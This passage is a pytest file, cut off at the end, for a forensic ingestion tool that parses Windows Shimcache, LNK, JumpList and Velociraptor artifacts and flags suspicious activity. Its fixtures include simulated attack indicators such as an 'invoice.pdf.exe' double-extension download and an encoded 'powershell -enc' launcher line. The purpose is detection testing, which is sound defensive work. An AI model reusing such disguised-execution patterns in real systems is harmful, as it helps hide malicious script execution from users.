    monkeypatch.setattr("app.ingest.raw_parsers.shimcache_parser._load_registry_module", lambda: fake_module)
    path = tmp_path / "SYSTEM"
    path.write_bytes(b"fake")
    result = ShimcacheRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": "C%3A/Windows/System32/config/SYSTEM", "name": "Shimcache raw - SYSTEM"},
    )
    assert result.parser_status == "parsed_native"
    assert len(result.events) == 1
    doc = result.events[0]
    assert doc["artifact"]["type"] == "shimcache"
    assert doc["artifact"]["parser"] == "shimcache_raw"
    assert doc["source_tool"] == "native_shimcache"
    assert doc["source_format"] == "registry_hive"
    assert doc["event"]["category"] == "execution"
    assert doc["event"]["type"] == "execution_candidate"
    assert doc["event"]["action"] == "shimcache_entry_observed"
    assert doc["execution"]["source"] == "shimcache"
    assert doc["execution"]["is_execution_confirmed"] is False
    assert doc["execution"]["confidence"] == "low"
    assert doc["file"]["path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"
    assert doc["file"]["name"] == "invoice.pdf.exe"
    assert doc["process"]["name"] == "invoice.pdf.exe"
    assert doc["@timestamp"] == "2026-05-03T10:00:00+00:00"
    assert doc["timestamp_precision"] == "shimcache_last_modified"
    assert doc["execution"]["last_seen"] is None
    assert doc["execution"]["first_seen"] is None
    assert doc["execution"]["last_run"] is None
    assert doc["execution"]["last_modified"] == "2026-05-03T10:00:00+00:00"
    assert doc["shimcache"]["control_set"] == "ControlSet001"
    assert "double_extension" in doc["tags"]
    assert "user_writable_path" in doc["tags"]
    assert result.metadata["records_extracted"] == 1
    assert set(result.metadata["control_sets_seen"]) == {"ControlSet001", "CurrentControlSet"}
    assert result.metadata["sample_records"]
    assert result.metadata["sample_records"][0]["path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"
    assert result.metadata["sample_records"][0]["normalized_path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"
    assert result.metadata["sample_records"][0]["original_path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"


def test_normalize_shimcache_local_extended_length_path_is_not_treated_as_unc() -> None:
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "Path": r"\\?\C:\Windows\System32\SecurityHealth\1.0.29554.1001-0\SecurityHealthHost.exe",
            "LastModifiedTime": "2026-05-09T16:16:50.497874+00:00",
            "LastUpdate": "2026-05-09T16:32:37.010368+00:00",
            "ControlSet": "ControlSet001",
            "ParserStatus": "parsed_native",
        },
        {"artifact_type": "shimcache", "parser": "shimcache_raw", "source_tool": "native_shimcache", "source_format": "registry_hive", "name": "Shimcache raw - SYSTEM", "source_path": r"C:\Windows\System32\config\SYSTEM"},
    )
    assert document["file"]["path"] == r"C:\Windows\System32\SecurityHealth\1.0.29554.1001-0\SecurityHealthHost.exe"
    assert "system_path" in document["tags"]
    assert "unc_path" not in document["tags"]
    assert "network_path" not in document["tags"]
    assert "suspicious_path" not in document["tags"]
    assert document["risk_score"] == 0
    assert document["execution"]["last_seen"] is None
    assert document["execution"]["last_modified"] == "2026-05-09T16:16:50.497874+00:00"
    assert document["shimcache"]["last_update"] == "2026-05-09T16:32:37.010368+00:00"


def test_normalize_shimcache_unc_extended_length_path_is_treated_as_network() -> None:
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "Path": r"\\?\UNC\server01\share\tool.exe",
            "LastModifiedTime": "2026-05-09T16:16:50.497874+00:00",
            "ControlSet": "ControlSet001",
            "ParserStatus": "parsed_native",
        },
        {"artifact_type": "shimcache", "parser": "shimcache_raw", "source_tool": "native_shimcache", "source_format": "registry_hive", "name": "Shimcache raw - SYSTEM", "source_path": r"C:\Windows\System32\config\SYSTEM"},
    )
    assert document["file"]["path"] == r"\\server01\share\tool.exe"
    assert "unc_path" in document["tags"]
    assert "network_path" in document["tags"]


def test_windows_path_normalization_for_classification_handles_extended_length_and_unc() -> None:
    assert normalize_windows_path_for_classification(r"\\?\C:\Windows\System32\a.exe") == r"C:\Windows\System32\a.exe"
    assert normalize_windows_path_for_classification(r"\??\C:\Windows\System32\a.exe") == r"C:\Windows\System32\a.exe"
    assert normalize_windows_path_for_classification(r"\\.\C:\Windows\System32\a.exe") == r"C:\Windows\System32\a.exe"
    assert normalize_windows_path_for_classification(r"\\?\Volume{01db9a563242cde2-46329fd6}\Windows\System32\a.exe") == r"\Volume{01db9a563242cde2-46329fd6}\Windows\System32\a.exe"
    assert normalize_windows_path_for_classification(r"\VOLUME{01db9a563242cde2-46329fd6}\Windows\System32\a.exe") == r"\VOLUME{01db9a563242cde2-46329fd6}\Windows\System32\a.exe"
    assert normalize_windows_path_for_classification(r"\\SERVER\Share\a.exe") == r"\\SERVER\Share\a.exe"
    assert normalize_windows_path_for_classification(r"\\?\UNC\SERVER\Share\a.exe") == r"\\SERVER\Share\a.exe"
    assert is_windows_unc_path(r"\\SERVER\Share\a.exe") is True
    assert is_windows_unc_path(r"\\?\UNC\SERVER\Share\a.exe") is True
    assert is_windows_unc_path(r"\\?\C:\Windows\System32\a.exe") is False
    assert is_windows_unc_path(r"\??\C:\Windows\System32\a.exe") is False
    assert is_windows_unc_path(r"\\.\C:\Windows\System32\a.exe") is False
    assert is_windows_unc_path(r"\\?\Volume{01db9a563242cde2-46329fd6}\Windows\System32\a.exe") is False
    assert is_windows_unc_path(r"\VOLUME{01db9a563242cde2-46329fd6}\Windows\System32\a.exe") is False


def test_normalize_file_routes_shimcache_raw_to_native_parser(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    class _FakeParser:
        def parse(self, path: Path, *, case_id: str, evidence_id: str, artifact_id: str, artifact_meta: dict):
            assert path.name == "SYSTEM"
            assert artifact_meta["parser"] == "shimcache_raw"
            return SimpleNamespace(
                parser_name="shimcache_raw",
                artifact_type="shimcache",
                source_path=str(path),
                records_read=1,
                events=[{"artifact": {"type": "shimcache", "parser": "shimcache_raw"}, "event": {"type": "execution_candidate"}}],
                warnings=[],
                errors=[],
                parser_status="parsed_native",
                metadata={"audit": {"parser_name": "shimcache_raw", "records_read": 1, "events_indexed": 1, "parser_status": "parsed_native"}},
            )

    monkeypatch.setattr("app.ingest.normalizer.route_raw_parser", lambda *args, **kwargs: _FakeParser())
    path = tmp_path / "SYSTEM"
    path.write_bytes(b"fake")
    artifact_meta = {"parser": "shimcache_raw", "artifact_type": "shimcache", "source_path": "C%3A/Windows/System32/config/SYSTEM"}

    docs = normalize_file("case", "evidence", "artifact", path, artifact_meta)

    assert len(docs) == 1
    assert artifact_meta["raw_parser_status"] == "parsed_native"
    assert artifact_meta["ingest_audit"]["parser_name"] == "shimcache_raw"


def test_shimcache_raw_detection_from_velociraptor_collection_preserves_companions(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.shimcache_native_available", lambda: True)
    system_dir = tmp_path / "uploads" / "triage" / "C%3A" / "Windows" / "System32" / "config"
    system_dir.mkdir(parents=True)
    (system_dir / "SYSTEM").write_bytes(b"fake")
    (system_dir / "SYSTEM.LOG1").write_bytes(b"log1")
    (system_dir / "SYSTEM.LOG2").write_bytes(b"log2")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "shimcache")
    assert candidate.category == "shimcache"
    assert candidate.supported is True
    assert candidate.parser_status == "parsed_native"
    assert set(candidate.companion_files) == {
        "uploads/triage/C%3A/Windows/System32/config/SYSTEM.LOG1",
        "uploads/triage/C%3A/Windows/System32/config/SYSTEM.LOG2",
    }
    assert not any(item.original_path.lower().endswith(("system.log1", "system.log2")) for item in discovery.candidates)
    assert not any(
        item.original_path == "uploads/triage/C%3A/Windows/System32/config/SYSTEM"
        and item.category == "usb"
        for item in discovery.candidates
    )


def test_velociraptor_discovery_prioritizes_native_amcache_and_shimcache_over_generic_registry_candidates(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.shimcache_native_available", lambda: True)
    monkeypatch.setattr("app.ingest.raw_parsers.router.amcache_native_available", lambda: True)
    uploads = tmp_path / "uploads" / "triage" / "C%3A"
    system_dir = uploads / "Windows/System32/config"
    amcache_dir = uploads / "Windows/AppCompat/Programs"
    system_dir.mkdir(parents=True)
    amcache_dir.mkdir(parents=True)
    (system_dir / "SYSTEM").write_bytes(b"fake-system")
    (system_dir / "SYSTEM.LOG1").write_bytes(b"log1")
    (amcache_dir / "Amcache.hve").write_bytes(b"fake-amcache")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidates_by_path = {candidate.original_path: candidate for candidate in discovery.candidates}

    system_candidate = candidates_by_path["uploads/triage/C%3A/Windows/System32/config/SYSTEM"]
    assert system_candidate.category == "shimcache"
    assert system_candidate.artifact_type == "shimcache"
    assert system_candidate.supported is True

    amcache_candidate = candidates_by_path["uploads/triage/C%3A/Windows/AppCompat/Programs/Amcache.hve"]
    assert amcache_candidate.category == "amcache"
    assert amcache_candidate.artifact_type == "amcache"
    assert amcache_candidate.supported is True


def test_execution_artifacts_semi_auto_sections(monkeypatch) -> None:
    browser_download = {
        "event_id": "evt-browser-a",
        "evidence_id": "ev-browser",
        "@timestamp": "2026-05-03T10:00:00+00:00",
        "host": {"name": "movistar-pc"},
        "user": {"name": "alex"},
        "event": {"type": "file_downloaded", "severity": "medium", "message": "Browser download: invoice.pdf.exe from 198.51.100.10"},
        "browser": {"name": "Chrome", "profile": "Default", "artifact_type": "download", "url": "http://198.51.100.10/invoice.pdf.exe", "domain": "198.51.100.10"},
        "url": {"full": "http://198.51.100.10/invoice.pdf.exe", "domain": "198.51.100.10"},
        "download": {"url": "http://198.51.100.10/invoice.pdf.exe", "target_path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "file_name": "invoice.pdf.exe", "state": "Complete"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "name": "invoice.pdf.exe", "extension": ".exe"},
        "tags": ["browser", "download", "executable_download", "suspicious"],
        "suspicious_reasons": ["Executable downloaded", "Download from raw IP address"],
    }
    amcache_doc = normalize_file(
        "case-1",
        "ev-amcache",
        "art-amcache",
        Path(__file__).parent / "fixtures" / "amcache_sample.csv",
        {"artifact_type": "amcache", "name": "amcache_sample.csv", "source_path": "amcache_sample.csv", "parser": "zimmerman"},
    )[1]
    prefetch_event = {
        "event_id": "evt-prefetch-a",
        "evidence_id": "ev-prefetch",
        "@timestamp": "2026-05-03T10:05:00+00:00",
        "host": {"name": "movistar-pc"},
        "user": {"name": "alex"},
        "event": {"type": "program_execution", "severity": "medium", "message": "Program execution"},
        "process": {"name": "invoice.pdf.exe", "path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "command_line": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"},
        "execution": {"source": "prefetch", "run_count": 1, "last_run": "2026-05-03T10:05:00+00:00"},
        "tags": ["execution"],
        "suspicious_reasons": [],
    }
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter([browser_download, amcache_doc, prefetch_event]))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["program_inventory"]
    assert result["sections"]["downloaded_and_observed_programs"]
    assert result["sections"]["suspicious_programs"]
    assert result["sections"]["downloaded_and_observed_programs"][0]["key_fields"]["file_name"] == "invoice.pdf.exe"


def test_lnk_extracts_target_path(tmp_path: Path) -> None:
    path = tmp_path / "LECmd.csv"
    path.write_text(
        "SourceFile,TargetPath,Arguments,WorkingDirectory,MachineID,DriveSerialNumber,VolumeLabel,TargetAccessed\n"
        "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\payload.lnk,C:\\Temp\\payload.exe,-arg,C:\\Temp,DESKTOP-1,ABCD1234,USBVOL,2026-05-03T10:00:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "lnk", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["lnk"]["target_path"] == "C:\\Temp\\payload.exe"
    assert doc["lnk"]["effective_path"] == "C:\\Temp\\payload.exe"
    assert doc["lnk"]["effective_path_source"] == "target_path"
    assert doc["file"]["path"] == "C:\\Temp\\payload.exe"
    assert doc["lnk"]["arguments"] == "-arg"
    assert doc["lnk"]["working_directory"] == "C:\\Temp"
    assert doc["lnk"]["machine_id"] == "DESKTOP-1"
    assert doc["volume"]["serial"] == "ABCD1234"
    assert doc["volume"]["label"] == "USBVOL"
    assert doc["user"]["name"] == "alex"
    assert doc["event"]["timeline_include"] is True
    assert "suspicious_path" in doc["tags"]
    assert doc["raw"]["SourceFile"].endswith("payload.lnk")


def test_lnk_local_path_beats_shell_target_and_updates_summary(tmp_path: Path) -> None:
    path = tmp_path / "LECmd_Output.csv"
    path.write_text(
        "SourceFile,TargetIDAbsolutePath,LocalPath,RelativePath,FileAttributes,DriveType,VolumeSerialNumber,MachineID,SourceModified\n"
        "C:\\Users\\dfir\\Desktop\\Collection-movistar-pc-2026-05-03T11_30_24Z\\uploads\\auto\\C%3A\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\DFIRLab-training dataset-20260503-132748.lnk,Desktop\\\\\\\\,C:\\Users\\alex\\Desktop\\DFIRLabEvidence\\DFIRLab-training dataset-20260503-132748,..\\..\\..\\..\\..\\Desktop\\DFIRLabEvidence\\DFIRLab-training dataset-20260503-132748,FileAttributeDirectory,Fixed storage media (Hard drive),30764BF4,movistar-pc,2026-05-03T12:05:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "lnk", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    local_path = "C:\\Users\\alex\\Desktop\\DFIRLabEvidence\\DFIRLab-training dataset-20260503-132748"
    assert doc["lnk"]["effective_path"] == local_path
    assert doc["lnk"]["effective_path_source"] == "local_path"
    assert doc["file"]["path"] == local_path
    assert doc["file"]["name"] == "DFIRLab-training dataset-20260503-132748"
    assert doc["event"]["message"] == f"LNK target accessed: {local_path}"
    assert "Desktop\\\\" not in doc["event"]["message"]
    assert local_path in doc["raw_summary"]
    assert "DFIRLab-training dataset-20260503-132748" in doc["search_text"]
    assert "DFIRLabEvidence" in doc["search_text"]
    assert "30764BF4" in doc["search_text"]
    assert "movistar-pc" in doc["search_text"]
    assert doc["event"]["type"] == "folder_opened"
    assert "folder_access" in doc["tags"]
    assert "lnk" in doc["tags"]
    assert doc["raw"]["TargetIDAbsolutePath"] == "Desktop\\\\"
    assert doc["raw"]["LocalPath"] == local_path
    assert doc["lnk"]["target_id_absolute_path"] == "Desktop\\\\"
    assert doc["lnk"]["local_path"] == local_path


def test_lecmd_document_opened_classification(tmp_path: Path) -> None:
    path = tmp_path / "LECmd_Output.csv"
    path.write_text("SourceFile,TargetPath,TargetAccessed\nC:\\Users\\alex\\Desktop\\report.lnk,C:\\Users\\alex\\Documents\\report.docx,2026-05-03T09:00:00Z\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "lnk", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] in {"document_opened", "file_opened"}
    assert "document" in doc["tags"]


def test_lecmd_script_and_arguments_detection(tmp_path: Path) -> None:
    path = tmp_path / "LECmd_Output.csv"
    path.write_text(
        "SourceFile,TargetPath,Arguments,TargetAccessed\n"
        "C:\\Users\\alex\\Desktop\\runme.lnk,C:\\Users\\alex\\Downloads\\runme.ps1,powershell -enc aQ==,2026-05-03T10:00:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "lnk", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "program_or_script_opened"
    assert "script" in doc["tags"]
    assert "powershell" in doc["tags"]
    assert any("PowerShell encoded command" in reason or "invoke PowerShell" in reason for reason in doc["suspicious_reasons"])


def test_lecmd_unc_and_removable_media(tmp_path: Path) -> None:
    path = tmp_path / "LECmd_Output.csv"
    path.write_text(
        "SourceFile,TargetPath,NetworkPath,DriveType,MachineID,TargetAccessed\n"
        "C:\\Users\\alex\\Desktop\\share.lnk,\\\\SERVER\\Share\\tool.exe,\\\\SERVER\\Share\\tool.exe,Removable,HOST1,2026-05-03T11:00:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "lnk", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert "network_path" in doc["tags"]
    assert "unc_path" in doc["tags"]
    assert "removable_media" in doc["tags"]
    assert doc["network"]["path"] == "\\\\SERVER\\Share\\tool.exe"
    assert doc["destination"]["hostname"] == "server"


def test_lnk_effective_target_helper_prefers_local_path_over_shell_target() -> None:
    result = select_lnk_effective_target(
        {
            "target_path": "Desktop\\\\",
            "target_id_absolute_path": "Desktop\\\\",
            "local_path": "C:\\Users\\alex\\Desktop\\DFIRLabEvidence\\DFIRLab-training dataset-20260503-132748",
            "relative_path": "..\\..\\Desktop\\DFIRLabEvidence\\DFIRLab-training dataset-20260503-132748",
        }
    )
    assert result["effective_path"] == "C:\\Users\\alex\\Desktop\\DFIRLabEvidence\\DFIRLab-training dataset-20260503-132748"
    assert result["effective_path_source"] == "local_path"
    assert result["display_name"] == "DFIRLab-training dataset-20260503-132748"
    assert result["is_partial_path"] is False
    assert result["is_shell_target"] is False


def test_lnk_effective_target_helper_uses_network_path_if_no_local_path() -> None:
    result = select_lnk_effective_target({"target_path": "Desktop\\\\", "network_path": "\\\\server\\share\\file.txt"})
    assert result["effective_path"] == "\\\\server\\share\\file.txt"
    assert result["effective_path_source"] == "network_path"


def test_lnk_effective_target_helper_merges_local_and_common_path() -> None:
    result = select_lnk_effective_target({"local_path": "C:\\Users\\alex", "common_path": "Desktop\\note.txt"})
    assert result["effective_path"] == "C:\\Users\\alex\\Desktop\\note.txt"
    assert result["effective_path_source"] == "local_path+common_path"


def test_lnk_effective_target_helper_uses_target_path_when_full() -> None:
    result = select_lnk_effective_target({"target_path": "C:\\Users\\alex\\Desktop\\note.txt"})
    assert result["effective_path"] == "C:\\Users\\alex\\Desktop\\note.txt"
    assert result["effective_path_source"] == "target_path"


def test_lnk_effective_target_helper_uses_relative_path_when_it_is_all_we_have() -> None:
    result = select_lnk_effective_target({"relative_path": "..\\..\\Desktop\\file.txt"})
    assert result["effective_path"] == "..\\..\\Desktop\\file.txt"
    assert result["effective_path_source"] == "relative_path"


def test_lnk_effective_target_helper_falls_back_to_shell_target_display_name() -> None:
    result = select_lnk_effective_target({"target_path": "Internet Explorer (Homepage)"})
    assert result["effective_path"] == "Internet Explorer (Homepage)"
    assert result["display_name"] == "Internet Explorer (Homepage)"
    assert result["is_shell_target"] is True


def test_lnk_shell_and_useful_path_helpers() -> None:
    assert is_lnk_partial_or_shell_target("Desktop\\\\") is True
    assert is_lnk_partial_or_shell_target("Internet Explorer (Homepage)") is True
    assert is_lnk_partial_or_shell_target("C:\\Users\\alex\\Desktop\\file.txt") is False
    assert is_lnk_partial_or_shell_target("\\\\server\\share\\file.txt") is False
    assert is_lnk_partial_or_shell_target("..\\..\\Desktop\\file.txt") is False
    assert is_lnk_useful_path("C:\\Users\\alex\\Desktop\\file.txt") is True
    assert is_lnk_useful_path("\\\\server\\share\\file.txt") is True
    assert is_lnk_useful_path("..\\..\\Desktop\\file.txt") is True
    assert is_lnk_useful_path("Desktop\\\\") is False


def test_lecmd_handles_missing_columns_and_timestamps(tmp_path: Path) -> None:
    path = tmp_path / "LECmd_Output.csv"
    path.write_text("SourceFile,TargetPath\nC:\\Users\\alex\\Desktop\\x.lnk,\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "lnk", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["@timestamp"] is None
    assert "missing_timestamp" in doc["data_quality"]
    assert "missing_target_path" in doc["data_quality"]


def test_lecmd_fixture_integration() -> None:
    path = Path(__file__).parent / "fixtures" / "lecmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "lnk", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    assert len(docs) >= 5
    types = {doc["event"]["type"] for doc in docs}
    assert {"document_opened", "program_or_script_opened"}.issubset(types)
    assert any("network_path" in doc["tags"] for doc in docs)
    assert any(doc["user"]["name"] == "alex" for doc in docs)
    assert any(doc["lnk"].get("effective_path_source") == "target_path" for doc in docs)
    assert any(doc.get("search_text") for doc in docs)


def test_jlecmd_extracts_app_and_target(tmp_path: Path) -> None:
    path = tmp_path / "JLECmd_Output.csv"
    path.write_text(
        "SourceFile,AppId,AppIdDescription,TargetPath,LocalPath,Arguments,WorkingDirectory,MachineID,DriveSerialNumber,VolumeLabel,LastAccessed,InteractionCount\n"
        "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\powershell.automaticDestinations-ms,powershell.exe,Windows PowerShell,Desktop\\\\,C:\\Users\\alex\\Downloads\\runme.ps1,powershell -enc aQ==,C:\\Users\\alex\\Downloads,DESKTOP-1,ABCD1234,USBVOL,2026-05-03T10:00:00Z,4\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "jumplist", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["jumplist"]["app_id"] == "powershell.exe"
    assert doc["jumplist"]["app_name"] == "Windows PowerShell"
    assert doc["jumplist"]["effective_path"] == "C:\\Users\\alex\\Downloads\\runme.ps1"
    assert doc["jumplist"]["effective_path_source"] == "local_path"
    assert doc["file"]["path"] == "C:\\Users\\alex\\Downloads\\runme.ps1"
    assert doc["file"]["name"] == "runme.ps1"
    assert doc["jumplist"]["interaction_count"] == 4
    assert doc["user"]["name"] == "alex"
    assert doc["event"]["timeline_include"] is True
    assert doc["event"]["type"] == "program_or_script_opened"
    assert "powershell" in doc["tags"]
    assert "Windows PowerShell" in doc["search_text"]
    assert "powershell.exe" in doc["search_text"]
    assert doc["raw"]["SourceFile"].endswith("powershell.automaticDestinations-ms")


def test_jlecmd_document_opened_and_search_text(tmp_path: Path) -> None:
    path = tmp_path / "JLECmd_Output.csv"
    path.write_text(
        "SourceFile,AppIdDescription,Path,LastAccessed,InteractionCount\n"
        "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\edge.automaticDestinations-ms,Microsoft Edge,C:\\Users\\alex\\Documents\\report.docx,2026-05-03T08:10:00Z,5\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "jumplist", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] in {"document_opened", "file_opened"}
    assert doc.get("file", {}).get("path") in {None, "C:\\Users\\alex\\Documents\\report.docx"}
    assert "automaticDestinations" in doc["search_text"]


def test_jlecmd_unc_and_removable_media(tmp_path: Path) -> None:
    path = tmp_path / "JLECmd_Output.csv"
    path.write_text(
        "SourceFile,AppIdDescription,Path,NetworkPath,DriveType,MachineID,VolumeSerialNumber,LastAccessed\n"
        "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\explorer.automaticDestinations-ms,Explorer,\\\\SERVER\\Share\\tool.exe,\\\\SERVER\\Share\\tool.exe,Removable,HOST1,ABCD1234,2026-05-03T11:00:00Z\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "jumplist", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert "network_path" in doc["tags"]
    assert "unc_path" in doc["tags"]
    assert "removable_media" in doc["tags"]
    assert doc["network"]["path"] == "\\\\SERVER\\Share\\tool.exe"
    assert doc["destination"]["hostname"] == "server"


def test_jlecmd_handles_missing_columns_and_timestamps(tmp_path: Path) -> None:
    path = tmp_path / "JLECmd_Output.csv"
    path.write_text("SourceFile,AppId\nC:\\Users\\alex\\Desktop\\x.automaticDestinations-ms,unknown.app\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "jumplist", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["@timestamp"] is None
    assert "missing_timestamp" in doc["data_quality"]
    assert "missing_target_path" in doc["data_quality"]


def test_jlecmd_fixture_integration() -> None:
    path = Path(__file__).parent / "fixtures" / "jlecmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "jumplist", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    assert len(docs) >= 4
    types = {doc["event"]["type"] for doc in docs}
    assert {"document_opened", "program_or_script_opened"}.issubset(types)
    assert any(doc["jumplist"].get("effective_path_source") == "local_path" for doc in docs)
    assert any(doc["jumplist"].get("app_name") == "Microsoft Edge" for doc in docs)
    assert any("network_path" in doc["tags"] for doc in docs)
    assert any(doc["user"]["name"] == "alex" for doc in docs)
    assert any("powershell.exe" in doc["search_text"] for doc in docs)


def test_jlecmd_cloud_and_double_extension_classification() -> None:
    path = Path(__file__).parent / "fixtures" / "jlecmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "jumplist", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    assert docs


def test_semi_auto_includes_jumplist_recent_and_correlated_sections() -> None:
    from app.analysis import semi_auto as semi_auto_module

    jumplist_event = {
        "id": "jl-1",
        "event_id": "jl-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-jl",
        "@timestamp": "2026-05-03T10:00:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "artifact": {"type": "jumplist"},
        "event": {"type": "file_opened", "message": "JumpList item observed: C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "severity": "medium"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "extension": ".exe", "name": "invoice.pdf.exe"},
        "jumplist": {
            "source_file": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\edge.automaticDestinations-ms",
            "app_name": "Microsoft Edge",
            "app_id": "microsoftedge",
            "effective_path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe",
            "effective_path_source": "local_path",
            "arguments": "powershell -enc aQ==",
        },
        "network": {},
        "volume": {},
        "tags": ["jumplist", "file_access", "download", "double_extension", "suspicious", "user_writable_path"],
        "suspicious_reasons": ["JumpList references double extension file"],
        "source_file": "JLECmd_Output.csv",
    }
    browser_event = {
        "id": "br-1",
        "event_id": "br-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-br",
        "@timestamp": "2026-05-03T09:50:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "artifact": {"type": "browser"},
        "event": {"type": "file_downloaded", "message": "Downloaded file", "severity": "medium"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "name": "invoice.pdf.exe", "extension": ".exe"},
        "download": {"target_path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "file_name": "invoice.pdf.exe"},
        "browser": {"name": "Edge"},
        "url": {"domain": "example.test", "full": "https://example.test/invoice.pdf.exe"},
        "tags": ["browser", "download"],
        "suspicious_reasons": [],
        "source_file": "History",
    }
    recycle_event = {
        "id": "rb-1",
        "event_id": "rb-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-rb",
        "@timestamp": "2026-05-03T11:00:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "artifact": {"type": "recycle_bin"},
        "event": {"type": "file_recycled", "message": "File moved to Recycle Bin", "severity": "medium"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "name": "invoice.pdf.exe", "extension": ".exe"},
        "recycle": {"original_path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "original_file_name": "invoice.pdf.exe", "has_r_file": True},
        "tags": ["recycle_bin"],
        "suspicious_reasons": [],
        "source_file": "RBCmd_Output.csv",
    }
    shellbag_event = {
        "id": "sb-1",
        "event_id": "sb-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-sb",
        "@timestamp": "2026-05-03T09:45:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "artifact": {"type": "shellbags"},
        "event": {"type": "shellbag_folder_access", "message": "Shellbag folder observed: C:\\Users\\alex\\Downloads", "severity": "info"},
        "file": {"path": "C:\\Users\\alex\\Downloads", "name": "Downloads", "is_directory": True},
        "shellbag": {"path": "C:\\Users\\alex\\Downloads", "source_file": "SBECmd_Output.csv"},
        "tags": ["shellbags", "folder_access"],
        "suspicious_reasons": [],
        "source_file": "SBECmd_Output.csv",
    }

    original_iter = semi_auto_module.iter_case_events
    semi_auto_module.iter_case_events = lambda case_id, query=None: [jumplist_event, browser_event, recycle_event, shellbag_event]  # type: ignore[assignment]
    try:
        analysis = build_case_semi_auto_analysis("case-1")
    finally:
        semi_auto_module.iter_case_events = original_iter  # type: ignore[assignment]

    assert analysis["sections"]["recent_files"]
    assert analysis["sections"]["downloaded_files_opened"]
    assert analysis["sections"]["deleted_files_opened"]
    assert analysis["sections"]["suspicious_recent_items"]
    assert analysis["summary"]["recent_files"] >= 1
    assert analysis["summary"]["downloaded_files_opened"] >= 1


def test_recmd_run_key_suspicious_and_process_mapping(tmp_path: Path) -> None:
    path = tmp_path / "RECmd_Output.csv"
    path.write_text(
